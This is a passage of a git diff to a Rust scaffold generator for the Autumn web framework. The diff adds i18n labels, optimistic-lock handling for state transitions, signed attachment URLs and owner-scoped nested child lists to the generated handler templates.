-        (pagination_nav(&page_data, &PagerOptions::new("/{plural}/search").query(pager_query)))
+        {search_results_body}
     }};
     if hx.is_htmx {{
         return Ok(results);
     }}
-    Ok({layout_fn}("Search {pascal_name}s", {cp_index}{flash_arg}, html! {{
-        h1 {{ "Search {pascal_name}s" }}
-        (autumn_web::a11y::Link::new("/{plural}", "Back to list"))
+    Ok({layout_fn}({search_title}, {cp_index}{flash_arg}, html! {{
+        h1 {{ {search_heading} }}
+        (autumn_web::a11y::Link::new("/{plural}", {back_to_list}))
         div id="{plural}-search-results" {{ (results) }}
     }}))
 }}"#
@@ -3473,7 +7489,7 @@ pub async fn search(
 //! these are ordinary user code.
 {attachment_note}
 use autumn_web::extract::Path;
-use autumn_web::pagination::{{Page, PageRequest}};
+{i18n_imports}use autumn_web::pagination::{{Page, PageRequest}};
 {sort_imports}use autumn_web::reexports::axum::body::Bytes;
 use autumn_web::reexports::serde_json;
 use autumn_web::security::{{CsrfFormField, CsrfToken, SubmitFormField, SubmitToken}};
@@ -3491,18 +7507,18 @@ use crate::schema::{schema_import};",
              //! JavaScript: the generated `<form>` sets `enctype=\"multipart/form-data\"`,\n\
              //! and the `create`/`update` handlers accept an `autumn_web::extract::Multipart`\n\
              //! body, stream each file part straight to the configured blob store with\n\
-             //! `MultipartField::save_to_blob_store` (which enforces\n\
-             //! `security.upload.max_file_size_bytes`, default 16 MiB), and persist the\n\
-             //! resulting `Blob` on the record. An edit that doesn't re-upload preserves\n\
-             //! the existing attachment.\n\
+             //! `MultipartField::save_to_blob_store`, and persist the resulting `Blob` on\n\
+             //! the record. An edit that doesn't re-upload preserves the existing\n\
+             //! attachment, and the show/edit views render the stored file through a\n\
+             //! signed, time-bounded URL (`attachment_url`/`attachment_link` below).\n\
              //!\n\
-             //! SIZE CEILING with CSRF on (the prod-profile default): the CSRF middleware\n\
-             //! buffers the request body only up to ~2 MiB while scanning for the form\n\
-             //! token, so a zero-JS multipart upload larger than ~2 MiB is rejected with\n\
-             //! 403 (token not found in the truncated body) BEFORE the handler's\n\
-             //! `max_file_size_bytes`/413 check can run. For files above that ceiling, use\n\
-             //! the advanced presigned direct-upload path below (it doesn't route the file\n\
-             //! bytes through the CSRF-scanned form body).\n\
+             //! SIZE LIMITS: a file part larger than `security.upload.max_file_size_bytes`\n\
+             //! (default 16 MiB) is rejected with 413, and a request larger than\n\
+             //! `security.upload.max_request_size_bytes` (default 32 MiB) is rejected by\n\
+             //! the global body cap. CSRF adds no ceiling of its own: the generated form\n\
+             //! renders the CSRF and submit-token hidden inputs as its FIRST fields, so\n\
+             //! the browser sends them well inside `security.csrf.token_scan_bytes`\n\
+             //! however large the upload is — keep them first if you hand-edit the form.\n\
              //!\n\
              //! The `storage` + `multipart` features are enabled on `autumn-web`\n\
              //! automatically; configure `[storage]` in `autumn.toml` (local disk for dev,\n\
@@ -3578,6 +7594,15 @@ fn layout(title: &str, flash: Markup, content: Markup) -> Markup {{
         // a `show` handler threading CSRF for the transition forms, and one
         // `POST /{plural}/{{id}}/transitions/{field}` handler per state-machine
         // field.
+        // Issue #1323 AC5: the child's detail page links back to the parent it
+        // belongs to, closing the loop the parent's children list opens. Empty
+        // without `--belongs-to`.
+        let show_parent_backlink = nesting.map_or_else(String::new, |n| {
+            format!(
+                "\n        \" \"\n        (autumn_web::a11y::Link::new(crate::routes::{}::paths::show(row.{}), \"Back to {}\"))",
+                n.parent_plural, n.fk, n.parent_pascal
+            )
+        });
         let show_section = if has_state_machine {
             // `show_view` only touches the DB when it must resolve reference
             // display labels (issue #1146); otherwise the connection is unused, so
@@ -3602,20 +7627,20 @@ fn layout(title: &str, flash: Markup, content: Markup) -> Markup {{
 /// each state-machine transition handler's 422 re-render, so the detail-page
 /// markup has a single source of truth (issue #1326).
 async fn show_view(
-    {show_view_db_param},
+    {show_view_locale_param}{show_view_db_param},
     row: &{pascal_name},
     flash: Markup,
     csrf: Option<&CsrfToken>,
-    csrf_field: Option<&CsrfFormField>,
+    csrf_field: Option<&CsrfFormField>,{show_view_state_param}
 ) -> AutumnResult<Markup> {{
-{show_label_loads}    let props: Vec<(&str, maud::Markup)> = vec![
+{show_label_loads}{show_view_attachment_url_binds}{show_prop_binds}    let props: Vec<(&str, maud::Markup)> = vec![
 {show_rows}    ];
-    Ok({layout_fn}(&format!("{pascal_name} #{{}}", row.id), {cp_show}flash, html! {{
-        h1 {{ "{pascal_name} #" (row.id) }}
+    Ok({layout_fn}({show_view_title}, {cp_show}flash, html! {{
+        h1 {{ {show_view_heading} }}
         (autumn_web::widgets::property_list(&props))
-{show_transition_controls}        (autumn_web::a11y::Link::new(paths::index(), "Back to list"))
+{show_transition_controls}        (autumn_web::a11y::Link::new(paths::index(), {back_to_list}))
         " "
-        (autumn_web::a11y::Link::new(paths::edit(row.id), "Edit"))
+        (autumn_web::a11y::Link::new(paths::edit(row.id), {edit_link_text})){show_parent_backlink}
     }}))
 }}"#
             );
@@ -3623,11 +7648,11 @@ async fn show_view(
                 r#"/// `GET /{plural}/{{id}}` — show one {snake_name}.
 #[get("/{plural}/{{id}}")]
 pub async fn show(
-    id: Path<{id_rust}>,
+    {locale_param}id: Path<{id_rust}>,
     mut db: {db_ty},
     flash: Flash,
     csrf: Option<CsrfToken>,
-    csrf_field: Option<CsrfFormField>,
+    csrf_field: Option<CsrfFormField>,{show_state_param_line}
 ) -> AutumnResult<Markup> {{
     let row: {pascal_name} = {plural}::table
         .find(*id)
@@ -3635,7 +7660,7 @@ pub async fn show(
         .first(&mut *db)
         .await
         .map_err(AutumnError::not_found)?;
-    show_view(db, &row, {flash_arg}, csrf.as_ref(), csrf_field.as_ref()).await
+{show_authz_call}    show_view({show_view_locale_arg}db, &row, {flash_arg}, csrf.as_ref(), csrf_field.as_ref(){show_view_state_arg_call}).await
 }}"#
             );
             // Issue #1326 security fix (IDOR): a transition mutates an existing
@@ -3650,8 +7675,14 @@ pub async fn show(
             // `state`, so there is no attachment-reuse concern) and `&state` as the
             // `AppState` receiver. When policy wiring is off it emits nothing, so
             // the handler is exactly `id/db/flash/csrf/body` as before.
+            // Issue #1236: with attachments the shared `show_view` needs the app
+            // state to sign the stored file's URL. The authorize wiring already
+            // injects one; without it (`--no-policy`) the transition handler adds
+            // its own, and either binding shape coerces to `&AppState`.
             let transition_authz_params = if authorize {
                 "    autumn_web::extract::State(state): autumn_web::extract::State<autumn_web::AppState>,\n    session: autumn_web::session::Session,\n"
+            } else if has_attachments {
+                "    state: autumn_web::extract::State<autumn_web::AppState>,\n"
             } else {
                 ""
             };
@@ -3662,9 +7693,131 @@ pub async fn show(
             } else {
                 String::new()
             };
+            // Issue #1318: a state transition is a read-modify-write — it loads
+            // the row, asks `transition_{field}_to` whether the edge is legal
+            // from the state it just read, then writes. With a lock column in
+            // play that whole sequence becomes a compare-and-swap against the
+            // version it read, for two reasons:
+            //
+            //   * the GUARD stops two concurrent transitions out of the same
+            //     source state from both committing. Both would pass the
+            //     legality check against the stale row they each loaded, and an
+            //     `id`-only `WHERE` would let the second silently overwrite the
+            //     first's transition;
+            //   * the BUMP makes the transition visible to everyone else
+            //     guarding on the version — without it, an author holding an
+            //     edit form opened before the transition saves successfully and
+            //     is never told the record moved on, which is exactly the
+            //     "changed by someone else" case the 409 banner promises.
+            //
+            // Every fragment is empty without a lock column, including the tuple
+            // parentheses: the emitted `.set(...)` must stay the
+            // single-expression pre-#1318 form byte for byte.
+            let (transition_set_open, transition_lock_bump, transition_set_close) =
+                if lock_version.is_some() {
+                    (
+                        "(",
+                        format!(", {plural}::lock_version.eq({plural}::lock_version + 1)"),
+                        ")",
+                    )
+                } else {
+                    ("", String::new(), "")
+                };
+            let transition_update_bind = if lock_version.is_some() {
+                "let updated = "
+            } else {
+                ""
+            };
+            let transition_lock_filter = lock_version.map_or_else(String::new, |_| {
+                format!(".filter({plural}::lock_version.eq(row.lock_version))")
+            });
+            // Zero rows is ambiguous: the version moved between the load and
+            // the write, or the row was deleted outright. The block re-reads to
+            // tell them apart — 409 with the detail page re-rendered for a
+            // record someone else changed, 404 for one that is gone — rather
+            // than redirecting with a success flash for a transition that never
+            // happened, or offering a conflict page whose suggested reload
+            // cannot succeed. It renders the RE-READ row, not this request's
+            // snapshot: the reader is deciding again, and the legal edges may
+            // no longer be the ones they were shown.
+            // The re-read row must be re-authorized before it is rendered. The
+            // policy check earlier in this handler ran against `row`, the
+            // snapshot this request loaded; a record policy can depend on
+            // mutable row data (the generated owner policy does), so the very
+            // concurrent write that moved the version may also have moved the
+            // row out of this actor's reach. Rendering `current` unchecked would
+            // hand them its current properties and transition controls. Empty
+            // without a policy, where there is nothing to re-check.
+            let transition_conflict_reauthz = if authorize {
+                format!(
+                    "                autumn_web::authorization::authorize::<{pascal_name}>(&state, &session, \"update\", &current).await?;\n"
+                )
+            } else {
+                String::new()
+            };
+            let transition_conflict_block = lock_version.map_or_else(String::new, |_| {
+                format!(
+                    "            if updated == 0 {{\n                \
+                     // Zero rows is ambiguous — the version moved on, or the row\n                \
+                     // is gone entirely. Re-read to tell them apart, exactly as the\n                \
+                     // `update` handler does: a 409 for a record someone else\n                \
+                     // changed, a 404 for one that no longer exists. Without this a\n                \
+                     // concurrent delete would render a conflict page for a row that\n                \
+                     // cannot be reloaded.\n                \
+                     let current: Option<{pascal_name}> = {plural}::table\n                    \
+                     .find(*id)\n                    \
+                     .select({pascal_name}::as_select())\n                    \
+                     .first(&mut *db)\n                    \
+                     .await\n                    \
+                     .optional()?;\n                \
+                     let Some(current) = current else {{\n                    \
+                     return Err(AutumnError::not_found_msg(format!(\n                        \
+                     \"{pascal_name} with id {{}} not found\", *id\n                    \
+                     )));\n                \
+                     }};\n\
+                     {transition_conflict_reauthz}                \
+                     flash.error({flash_stale}).await;\n                \
+                     // Render the row as it NOW stands, not the snapshot this\n                \
+                     // request loaded: the reader is deciding again, and the legal\n                \
+                     // transitions may well be different from the ones they saw.\n                \
+                     let view = show_view(\n                    \
+                     {show_view_locale_arg_multiline}db,\n                    \
+                     &current,\n                    \
+                     flash_messages(&flash.consume().await),\n                    \
+                     csrf.as_ref(),\n                    \
+                     csrf_field.as_ref(){show_view_state_arg_call},\n                \
+                     )\n                \
+                     .await?;\n                \
+                     return Ok((autumn_web::reexports::http::StatusCode::CONFLICT, view).into_response());\n            \
+                     }}\n"
+                )
+            });
             let mut transition_handlers = String::new();
             for f in &sm_fields {
                 let field = &f.name;
+                // Per FIELD as well as per resource: "Post status updated" and
+                // "Post visibility updated" are different sentences, and a
+                // model can carry more than one state-machine column.
+                let flash_transitioned = labels.lit(
+                    &format!("{snake_name}.flash.{field}_updated"),
+                    &format!("{pascal_name} {field} updated"),
+                );
+                // Issue #1349: the REJECTION is user-facing too, and it is the
+                // one an ordinary reader is most likely to hit. `err` here is
+                // the model method's error, whose Display is built in
+                // autumn-macros as a hardcoded English "Cannot transition …" —
+                // a string this generator cannot route a `t!` through. So under
+                // `--i18n` the flash carries a translated message instead of
+                // the error's own text. One shared key: the sentence does not
+                // vary by field, and the specifics it drops (which edge was
+                // refused) are developer detail rather than something an author
+                // clicking a button can act on.
+                let flash_rejected = labels.expr(
+                    "common.transition.rejected",
+                    "That change is not allowed from the current state.",
+                    "err.to_string()",
+                    &[],
+                );
                 let handler = format!(
                     r#"/// `POST /{plural}/{{id}}/transitions/{field}` — apply a `{field}` state
 /// transition (issue #1326). A legal edge persists the new `{field}` value and
@@ -3673,7 +7826,7 @@ pub async fn show(
 #[secured]
 #[post("/{plural}/{{id}}/transitions/{field}")]
 pub async fn transition_{field}(
-    id: Path<{id_rust}>,
+    {locale_param}id: Path<{id_rust}>,
     mut db: {db_ty},
     flash: Flash,
     csrf: Option<CsrfToken>,
@@ -3692,21 +7845,21 @@ pub async fn transition_{field}(
     let target = submitted.get("{field}").cloned().unwrap_or_default();
     match row.transition_{field}_to(&target) {{
         Ok(new_state) => {{
-            diesel::update({plural}::table.find(*id))
-                .set({plural}::{field}.eq(new_state))
+            {transition_update_bind}diesel::update({plural}::table.find(*id){transition_lock_filter})
+                .set({transition_set_open}{plural}::{field}.eq(new_state){transition_lock_bump}{transition_set_close})
                 .execute(&mut *db)
                 .await?;
-            flash.success("{pascal_name} {field} updated").await;
+{transition_conflict_block}            flash.success({flash_transitioned}).await;
             Ok(autumn_web::Redirect::to(&paths::show(*id)).into_response())
         }}
         Err(err) => {{
-            flash.error(err.to_string()).await;
+            flash.error({flash_rejected}).await;
             let view = show_view(
-                db,
+                {show_view_locale_arg_multiline}db,
                 &row,
                 flash_messages(&flash.consume().await),
                 csrf.as_ref(),
-                csrf_field.as_ref(),
+                csrf_field.as_ref(){show_view_state_arg_call},
             )
             .await?;
             Ok((autumn_web::reexports::http::StatusCode::UNPROCESSABLE_ENTITY, view).into_response())
@@ -3724,23 +7877,23 @@ pub async fn transition_{field}(
             format!(
                 r#"
 
-/// `GET /{plural}/{{id}}` — show one {snake_name}.
-#[get("/{plural}/{{id}}")]
-pub async fn show(id: Path<{id_rust}>, mut db: {db_ty}, flash: Flash) -> AutumnResult<Markup> {{
+/// `GET /{plural}/{{{id_url_segment}}}` — show one {snake_name}.
+#[get("/{plural}/{{{id_url_segment}}}")]
+pub async fn show({locale_param_inline}{id_param_decl}, mut db: {db_ty}, flash: Flash{show_state_param}) -> AutumnResult<Markup> {{
     let row: {pascal_name} = {plural}::table
-        .find(*id)
+        .{find_expr}
         .select({pascal_name}::as_select())
         .first(&mut *db)
         .await
         .map_err(AutumnError::not_found)?;
-{show_label_loads}    let props: Vec<(&str, maud::Markup)> = vec![
+{show_authz_call}{show_label_loads}{show_attachment_url_binds}{show_prop_binds}    let props: Vec<(&str, maud::Markup)> = vec![
 {show_rows}    ];
-    Ok({layout_fn}(&format!("{pascal_name} #{{}}", row.id), {cp_show}{flash_arg}, html! {{
-        h1 {{ "{pascal_name} #" (row.id) }}
+    Ok({layout_fn}({show_title}, {cp_show}{flash_arg}, html! {{
+        h1 {{ {show_heading} }}
         (autumn_web::widgets::property_list(&props))
-        (autumn_web::a11y::Link::new(paths::index(), "Back to list"))
+        (autumn_web::a11y::Link::new(paths::index(), {back_to_list}))
         " "
-        (autumn_web::a11y::Link::new(paths::edit(row.id), "Edit"))
+        (autumn_web::a11y::Link::new(paths::edit({route_key_display_expr}), {edit_link_text})){show_parent_backlink}
     }}))
 }}
 "#
@@ -3771,13 +7924,13 @@ fn submit_token_input(submit_token: Option<&SubmitToken>, field: Option<&SubmitF
         }}
     }}
 }}
-{private_layout}
-{index_handler}{show_section}
+{bulk_ids_parser}{attachment_read_back_helpers}{private_layout}
+{index_handler}{bulk_delete_fn}{export_csv_fn}{trash_section}{reorder_section}{show_section}
 /// `GET /{plural}/new` — render the new-{snake_name} form.
 #[secured]
 #[get("/{plural}/new", name = "new")]
 pub async fn new_form(
-    {new_form_db_param}flash: Flash,
+    {locale_param}{new_form_db_param}flash: Flash,
     csrf: Option<CsrfToken>,
     csrf_field: Option<CsrfFormField>,
     submit_token: Option<SubmitToken>,
@@ -3788,51 +7941,51 @@ pub async fn new_form(
 }}
 
 {unique_constraints_const}{create_fn}
-/// `GET /{plural}/{{id}}/edit` — render the edit form. Submission goes to
+/// `GET /{plural}/{{{id_url_segment}}}/edit` — render the edit form. Submission goes to
 /// the `update` handler below as a plain HTML POST (browsers can't submit
 /// PUT directly without JS); the auto-generated JSON `PUT /api/{plural}/{{id}}`
 /// remains available for API clients.
 #[secured]
-#[get("/{plural}/{{id}}/edit", name = "edit")]
+#[get("/{plural}/{{{id_url_segment}}}/edit", name = "edit")]
 pub async fn edit_form(
-    id: Path<{id_rust}>,
+    {locale_param}{id_param_decl},
     mut db: {db_ty},
     flash: Flash,
     csrf: Option<CsrfToken>,
     csrf_field: Option<CsrfFormField>,
     submit_token: Option<SubmitToken>,
-    submit_field: Option<SubmitFormField>,{edit_destroy_authz_params}
+    submit_field: Option<SubmitFormField>,{edit_destroy_authz_params}{edit_form_state_param}
 ) -> AutumnResult<Markup> {{
     let row: {pascal_name} = {plural}::table
-        .find(*id)
+        .{find_expr}
         .select({pascal_name}::as_select())
         .first(&mut *db)
         .await
         .map_err(AutumnError::not_found)?;
     {authz_edit_call}let changeset = Changeset::new({pascal_name}Form::from(&row));
-    Ok({edit_form_body})
+    {edit_lock_binds}{edit_current_bind}Ok({edit_form_body})
 }}
 
 {update_fn}
-/// `POST /{plural}/{{id}}/delete` — delete a row, then redirect to the list.
+/// `POST /{plural}/{{{id_url_segment}}}/delete` — delete a row, then redirect to the list.
 /// Browsers can't submit `DELETE` without JS, so the show page's delete button
 /// posts here; the JSON `DELETE /api/{plural}/{{id}}` stays available for API
 /// clients via the auto-generated repository handler. Honours the resource's
 /// soft-delete configuration (marks `deleted_at` when `--soft-delete` is set).
 #[secured]
-#[post("/{plural}/{{id}}/delete", name = "delete")]
+#[post("/{plural}/{{{id_url_segment}}}/delete", name = "delete")]
 pub async fn destroy(
-    id: Path<{id_rust}>,
+    {locale_param}{id_param_decl},
     {destroy_signature_arg},
     flash: Flash,
 ) -> AutumnResult<autumn_web::Redirect> {{
     {authz_destroy_preamble}{destroy_stmt}
     if deleted == 0 {{
         return Err(AutumnError::not_found_msg(format!(
-            "{pascal_name} with id {{}} not found", *id
+            "{pascal_name} with id {{}} not found", {id_value_expr}
         )));
     }}
-    flash.success("{pascal_name} deleted").await;
+    flash.success({flash_destroyed}).await;
     Ok(autumn_web::Redirect::to(&paths::index()))
 }}
 
@@ -3861,7 +8014,7 @@ pub async fn destroy(
 fn is_nullable_form_field(name: &str) -> bool {{
     {nullable_field_match}
 }}
-"#
+{lock_version_parser}"#
         )
     } + &if live {
         format!(
@@ -3878,8 +8031,420 @@ pub async fn events(
     } else {
         String::new()
     } + &validate_handlers
+        + &preview_handlers
         + &paths_macro
         + &search_handler
+        + &nested_section
+        + &attachment_read_back_unit_tests
+}
+
+/// Render the `--belongs-to` nested surface appended to the child's routes
+/// module (issue #1323): the shared `children_section` the parent's own `show`
+/// view renders, the full-page `nested_view` wrapper, and the two nested
+/// handlers (`GET`/`POST /<parents>/{<fk>}/<children>`).
+///
+/// Returns the empty string for every flat scaffold, so a resource generated
+/// without `--belongs-to` keeps byte-for-byte the output it had before this
+/// feature existed.
+#[allow(
+    clippy::too_many_arguments,
+    clippy::fn_params_excessive_bools,
+    clippy::too_many_lines,
+    reason = "one template — the whole point is a single place that prints one \
+              coherent block of generated code"
+)]
+fn render_nested_section(
+    pascal_name: &str,
+    snake_name: &str,
+    plural: &str,
+    nesting: &super::nested::Nesting,
+    // The FORM field list (the same one the flat index/forms render from).
+    fields: &[Field],
+    reference_fields: &[&Field],
+    reference_displays: &BTreeMap<String, ReferenceDisplay>,
+    route_key_field: Option<&str>,
+    soft_delete: bool,
+    has_state_machine: bool,
+    has_lock_version: bool,
+    has_unique: bool,
+    authorize: bool,
+    // The owner column the flat index scopes its list to (issue #1125/#1830), or
+    // `None` when this scaffold has none. `Some` makes the nested list carry the
+    // SAME owner scoping, so nesting can never widen what a resource discloses.
+    owner_scoped: Option<&str>,
+    layout_fn: &str,
+    cp_nested: &str,
+    flash_arg: &str,
+) -> String {
+    let fk = nesting.fk.as_str();
+    let parent_plural = nesting.parent_plural.as_str();
+    let parent_pascal = nesting.parent_pascal.as_str();
+    let parent_snake = nesting.parent_snake.as_str();
+    let route = nesting.route_path(plural);
+
+    // The parent foreign key is dropped from the child list's columns: in a
+    // list already scoped to one parent it is the same value on every row, so a
+    // column for it is pure noise (and, with #1146 display labels, an extra
+    // query per page for a value the page title already states).
+    let list_fields: Vec<Field> = fields.iter().filter(|f| f.name != fk).cloned().collect();
+
+    // Display-label maps for the remaining `references` columns, mirroring what
+    // the flat index loads (#835: scoped to `page_data.content`'s own FK
+    // values via `WHERE id = ANY(...)`, not a full-table load — the nested
+    // list is paginated exactly like the flat index, so the same over-fetch
+    // applied here too). Written here rather than reusing
+    // `render_index_reference_label_loads` because this helper holds the
+    // connection as `&mut Db` (so a parent can render several children off one
+    // connection), which needs a double-deref reborrow (`&mut **db`) at each
+    // call site — matching `total`/`items` above, not the single-deref owned
+    // `db: Db` the flat index handlers take.
+    let mut label_loads = String::new();
+    for f in reference_fields {
+        if f.name == fk {
+            continue;
+        }
+        let Some(display) = reference_displays.get(&f.name) else {
+            continue;
+        };
+        let Some(table) = f.reference_table() else {
+            continue;
+        };
+        let name = &f.name;
+        let column = &display.column;
+        let (load_ty, label_expr) = if display.column_nullable {
+            ("Option<String>", "label.unwrap_or_else(|| id.to_string())")
+        } else {
+            ("String", "label")
+        };
+        let ids_expr = if f.nullable {
+            format!("page_data.content.iter().filter_map(|row| row.{name}).collect()")
+        } else {
+            format!("page_data.content.iter().map(|row| row.{name}).collect()")
+        };
+        let _ = writeln!(
+            label_loads,
+            "    let {name}_ids: Vec<i64> = {ids_expr};\n    \
+             let {name}_labels: std::collections::HashMap<String, String> = {table}::table\n        \
+             .filter({table}::id.eq_any({name}_ids))\n        \
+             .select(({table}::id, {table}::{column}))\n        \
+             .load::<(i64, {load_ty})>(&mut **db)\n        \
+             .await?\n        \
+             .into_iter()\n        \
+             .map(|(id, label)| (id.to_string(), {label_expr}))\n        \
+             .collect();"
+        );
+    }
+    let columns = render_columns_vec(
+        pascal_name,
+        snake_name,
+        &list_fields,
+        reference_displays,
+        true,
+        route_key_field,
+        false,
+        // Issue #1349: `--belongs-to` is refused alongside `--i18n` upstream —
+        // this section splices markup into the PARENT's already-generated `show`
+        // handler, whose signature carries no `Locale` extractor — so the nested
+        // child list always renders the plain English labels.
+        &scaffold_i18n::ViewLabels::disabled(),
+    );
+
+    // Select options for the inline form's OTHER `references` columns. The
+    // parent FK gets an empty slice: `exclude_parent_fk` drops its control, so
+    // the options would never be rendered — loading them would be a wasted
+    // query on every parent show page.
+    let mut option_loads = String::new();
+    let mut option_args = String::new();
+    for f in reference_fields {
+        let name = &f.name;
+        if name == fk {
+            option_args.push_str(", &[]");
+            continue;
+        }
+        let _ = writeln!(
+            option_loads,
+            "    let {name}_options = {name}_select_options(&mut *db).await?;"
+        );
+        let _ = write!(option_args, ", &{name}_options");
+    }
+    // The nested form is a CREATE form, so it mirrors the flat create call's
+    // trailing flags: keep state-machine columns (the initial state), no lock
+    // version to guard against — plus `true` for the nested-only FK exclusion.
+    let form_exclude_state = if has_state_machine { ", false" } else { "" };
+    let form_lock = if has_lock_version { ", None" } else { "" };
+    // Soft-deleted children must not resurface in the parent's list; the flat
+    // index gets this for free through the repository's soft-delete support,
+    // but this parent-scoped query is hand-written.
+    let deleted_filter = if soft_delete {
+        format!("\n        .filter({plural}::deleted_at.is_null())")
+    } else {
+        String::new()
+    };
+
+    // SECURITY (issue #1125/#1830 posture parity): when the flat `GET /{plural}`
+    // index is owner-scoped, the nested list must be too. Otherwise
+    // `--belongs-to` would quietly open a SECOND, unscoped door onto the same
+    // rows — a child list scoped only by parent would disclose every user's
+    // children of that parent, including through the parent's public show page.
+    // The scoping lives in `children_section_with`, so BOTH entry points (the
+    // nested page and the parent's show view) inherit it.
+    //
+    // The `AppState`/`Session` pair is always in the helper's signature — the
+    // parent-side injection emits one fixed call shape — but is `_`-prefixed
+    // (and so warning-free) for a scaffold with no owner column.
+    let (state_param, session_param, owner_prelude, owner_filter) = owner_scoped.map_or_else(
+        || (
+            "_state: &autumn_web::AppState",
+            "_session: &autumn_web::session::Session",
+            String::new(),
+            String::new(),
+        ),
+        |owner_col| (
+            "state: &autumn_web::AppState",
+            "session: &autumn_web::session::Session",
+            "    let ctx = autumn_web::authorization::PolicyContext::from_request(state, session).await;\n    let owner_id = ctx.user_id_i64().unwrap_or(-1);\n"
+                .to_owned(),
+            format!("\n        .filter({plural}::{owner_col}.eq(owner_id))"),
+        ),
+    );
+    // The nested page is `#[secured]` exactly when the flat index is — i.e.
+    // whenever the list is owner-scoped and therefore only meaningful for a
+    // signed-in user.
+    let nested_index_secured = if owner_scoped.is_some() {
+        "#[secured]\n"
+    } else {
+        ""
+    };
+
+    // Authorization mirrors the flat `create` exactly: a nested create is still
+    // a create, so it runs the same context-only `authorize_create` check
+    // against the same policy (issue #1125). Without policy wiring both
+    // fragments are empty and the handler is just path/flash/csrf/db/body.
+    let authz_call = if authorize {
+        format!(
+            "    autumn_web::authorization::authorize_create::<{pascal_name}>(&state, &session).await?;\n"
+        )
+    } else {
+        String::new()
+    };
+    // The argument names `children_section` forwards to `children_section_with`
+    // — `_`-prefixed in lockstep with `{state_param}`/`{session_param}` so an
+    // unscoped scaffold stays warning-free.
+    let (state_arg, session_arg) = if owner_scoped.is_some() {
+        ("state", "session")
+    } else {
+        ("_state", "_session")
+    };
+
+    // A duplicate value on a `unique` column is a constraint violation, not a
+    // validation failure, so — exactly like the flat create (issue #1032) — it
+    // is classified into an inline field error and re-rendered at 422 rather
+    // than surfacing as a 500.
+    let insert_record = insert_record_expr(fields);
+    let insert_block = if has_unique {
+        format!(
+            "    let result: AutumnResult<()> = async {{\n        \
+             diesel::insert_into({plural}::table)\n            \
+             .values({insert_record})\n            \
+             .execute(&mut *db)\n            .await?;\n        \
+             Ok(())\n    \
+             }}.await;\n    \
+             if let Err(err) = result {{\n        \
+             if let Some((field, message)) = autumn_web::error::unique_violation_field(&err, UNIQUE_CONSTRAINTS) {{\n            \
+             let mut errors = std::collections::HashMap::new();\n            \
+             errors.insert(field.to_string(), vec![message.to_string()]);\n            \
+             let changeset = Changeset::from_errors(changeset.into_inner(), errors);\n            \
+             let view = nested_view(&mut db, *{fk}, &PageRequest::default(), &changeset, {flash_arg}, &state, &session, csrf.as_ref(), csrf_field.as_ref(), submit_token.as_ref(), submit_field.as_ref()).await?;\n            \
+             return Ok((autumn_web::reexports::http::StatusCode::UNPROCESSABLE_ENTITY, view).into_response());\n        \
+             }}\n        \
+             return Err(err);\n    \
+             }}\n"
+        )
+    } else {
+        format!(
+            "    diesel::insert_into({plural}::table)\n        \
+             .values({insert_record})\n        \
+             .execute(&mut *db)\n        .await?;\n"
+        )
+    };
+
+    format!(
+        r#"
+
+/// Render one {parent_snake}'s {plural} — the paginated child list plus the
+/// inline "add" form posting to `POST {route}` (issue #1323).
+///
+/// `pub` on purpose: the {parent_snake} resource's generated `show` view calls
+/// it, and so can any hand-written page that wants the same section. Takes the
+/// connection by `&mut` so one page can render several children off it.
+#[allow(clippy::too_many_arguments)]
+pub async fn children_section(
+    db: &mut Db,
+    {fk}: i64,
+    page_req: &PageRequest,
+    {state_param},
+    {session_param},
+    csrf: Option<&CsrfToken>,
+    csrf_field: Option<&CsrfFormField>,
+    submit_token: Option<&SubmitToken>,
+    submit_field: Option<&SubmitFormField>,
+) -> AutumnResult<Markup> {{
+    children_section_with(
+        db,
+        {fk},
+        page_req,
+        &Changeset::new({pascal_name}Form::default()),
+        {state_arg},
+        {session_arg},
+        csrf,
+        csrf_field,
+        submit_token,
+        submit_field,
+    )
+    .await
+}}
+
+/// The shared body behind [`children_section`], also used by `nested_create`'s
+/// 422 re-render — which hands it the *invalid* changeset so the inline form
+/// comes back with the submitted values and per-field errors intact (#1124).
+#[allow(clippy::too_many_arguments)]
+async fn children_section_with(
+    db: &mut Db,
+    {fk}: i64,
+    page_req: &PageRequest,
+    changeset: &Changeset<{pascal_name}Form>,
+    {state_param},
+    {session_param},
+    csrf: Option<&CsrfToken>,
+    csrf_field: Option<&CsrfFormField>,
+    submit_token: Option<&SubmitToken>,
+    submit_field: Option<&SubmitFormField>,
+) -> AutumnResult<Markup> {{
+{owner_prelude}    let total: i64 = {plural}::table
+        .filter({plural}::{fk}.eq({fk})){deleted_filter}{owner_filter}
+        .count()
+        .get_result(&mut **db)
+        .await?;
+    let items: Vec<{pascal_name}> = {plural}::table
+        .filter({plural}::{fk}.eq({fk})){deleted_filter}{owner_filter}
+        .select({pascal_name}::as_select())
+        .order({plural}::id.desc())
+        .limit(page_req.limit())
+        .offset(page_req.offset())
+        .load(&mut **db)
+        .await?;
+    let page_data: Page<{pascal_name}> = Page::new(items, total, page_req);
+{label_loads}{columns}{option_loads}    let nested_base = paths::nested_index({fk});
+    Ok(html! {{
+        section id="{parent_snake}-{plural}" aria-labelledby="{parent_snake}-{plural}-heading" {{
+            h2 id="{parent_snake}-{plural}-heading" {{ "{pascal_name}s" }}
+            (autumn_web::widgets::data_table(&page_data.content, &columns, &autumn_web::widgets::DataTableConfig::new("No {plural} yet.").base_path(&nested_base)))
+            (pagination_nav(&page_data, &PagerOptions::new(&nested_base)))
+            h3 {{ "Add {pascal_name}" }}
+            ({snake_name}_form_for(changeset, paths::nested_create({fk}), "Add {pascal_name}", csrf, csrf_field, submit_token, submit_field{option_args}{form_exclude_state}{form_lock}, true))
+        }}
+    }})
+}}
+
+/// Confirm the parent {parent_snake} exists, so a request naming one that does
+/// not answers **404** rather than a plausible-looking empty list — and so a
+/// nested create fails as a not-found instead of surfacing the foreign-key
+/// constraint violation as a 500.
+///
+/// Only the routes that take the id from an untrusted URL call this; the
+/// parent's own `show` view already loaded the row before it renders the
+/// section, so it pays nothing.
+async fn require_{parent_snake}(db: &mut Db, {fk}: i64) -> AutumnResult<()> {{
+    {parent_plural}::table
+        .find({fk})
+        .select({parent_plural}::id)
+        .first::<i64>(&mut **db)
+        .await
+        .map_err(AutumnError::not_found)?;
+    Ok(())
+}}
+
+/// The standalone page wrapper around [`children_section_with`] — shared by
+/// `nested_index` and `nested_create`'s 422 re-render so both render the same
+/// document.
+#[allow(clippy::too_many_arguments)]
+async fn nested_view(
+    db: &mut Db,
+    {fk}: i64,
+    page_req: &PageRequest,
+    changeset: &Changeset<{pascal_name}Form>,
+    flash: Markup,
+    state: &autumn_web::AppState,
+    session: &autumn_web::session::Session,
+    csrf: Option<&CsrfToken>,
